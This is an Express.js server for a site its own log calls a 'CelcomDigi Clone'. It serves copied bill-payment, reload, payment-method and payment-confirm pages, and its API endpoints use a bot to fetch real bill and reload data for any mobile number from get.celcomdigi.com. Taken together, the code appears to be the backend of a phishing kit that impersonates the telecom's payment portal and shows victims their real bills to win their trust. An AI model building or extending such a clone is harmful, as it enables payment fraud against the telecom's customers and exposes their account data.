const express = require('express');
const path = require('path');
const { fetchBillData, fetchReloadData } = require('./bill-bot');

const app = express();
const PORT = process.env.PORT || 3000;

// Parse JSON body
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname)));
app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));

// ============================================================
// API ENDPOINTS - Bill Payment Bot
// ============================================================

/**
 * POST /api/bill-check
 * Body: { mobileNumber: "60123456789", useAccountNumber: false }
 * Returns real bill data from get.celcomdigi.com
 */
app.post('/api/bill-check', async (req, res) => {
  const { mobileNumber, number, useAccountNumber } = req.body;
  const phoneNumber = mobileNumber || number;

  if (!phoneNumber) {
    return res.status(400).json({ success: false, error: 'Mobile number is required' });
  }

  // Basic validation
  const cleanNumber = phoneNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Please enter a valid/active Celcom or Digi mobile number.'
    });
  }

  try {
    console.log(`[Bill Bot] Fetching bill for: ${cleanNumber}`);
    const result = await fetchBillData(cleanNumber, useAccountNumber || false);
    console.log(`[Bill Bot] Result: ${result.success ? 'SUCCESS' : 'FAILED - ' + result.error}`);
    return res.json(result);
  } catch (error) {
    console.error(`[Bill Bot] Error:`, error.message);
    return res.status(500).json({
      success: false,
      error: 'Unable to fetch bill data. Please try again.'
    });
  }
});

/**
 * POST /api/reload-check
 * Body: { mobileNumber: "60123456789" }
 * Returns reload availability from get.celcomdigi.com
 */
app.post('/api/reload-check', async (req, res) => {
  const { mobileNumber } = req.body;

  if (!mobileNumber) {
    return res.status(400).json({ success: false, error: 'Mobile number is required' });
  }

  const cleanNumber = mobileNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Please enter a valid/active Celcom or Digi prepaid mobile number.'
    });
  }

  try {
    console.log(`[Reload Bot] Checking reload for: ${cleanNumber}`);
    const result = await fetchReloadData(cleanNumber);
    console.log(`[Reload Bot] Result: ${result.success ? 'SUCCESS' : 'FAILED - ' + result.error}`);
    return res.json(result);
  } catch (error) {
    console.error(`[Reload Bot] Error:`, error.message);
    return res.status(500).json({
      success: false,
      error: 'Unable to check reload. Please try again.'
    });
  }
});

// ============================================================
// PAGE ROUTES
// ============================================================

// Malay version
app.get('/ms', (req, res) => {
  res.sendFile(path.join(__dirname, 'index-ms.html'));
});

// Reload Prepaid page
app.get('/reload', (req, res) => {
  res.sendFile(path.join(__dirname, 'reload.html'));
});
app.get('/reload/en', (req, res) => {
  res.sendFile(path.join(__dirname, 'reload.html'));
});

// Pay Bill page
app.get('/bill', (req, res) => {
  res.sendFile(path.join(__dirname, 'bill.html'));
});
app.get('/bill-payment', (req, res) => {
  res.sendFile(path.join(__dirname, 'bill.html'));
});
app.get('/bill-payment/en', (req, res) => {
  res.sendFile(path.join(__dirname, 'bill.html'));
});

// Pay Bill - after number verification (new page)
app.get('/pay-bill', (req, res) => {
  res.sendFile(path.join(__dirname, 'pay-bill.html'));
});

// Payment Method Selection
app.get('/payment-method', (req, res) => {
  res.sendFile(path.join(__dirname, 'payment-method.html'));
});

// Payment Confirm
app.get('/payment-confirm', (req, res) => {
  res.sendFile(path.join(__dirname, 'payment-confirm.html'));
});

// English version (default)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// All other routes serve index.html (but NOT static file extensions)
app.get('*', (req, res) => {
  if (req.path.match(/\.[a-zA-Z0-9]+$/)) {
    return res.status(404).send('Not found');
  }
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`CelcomDigi Clone running on port ${PORT}`);
});
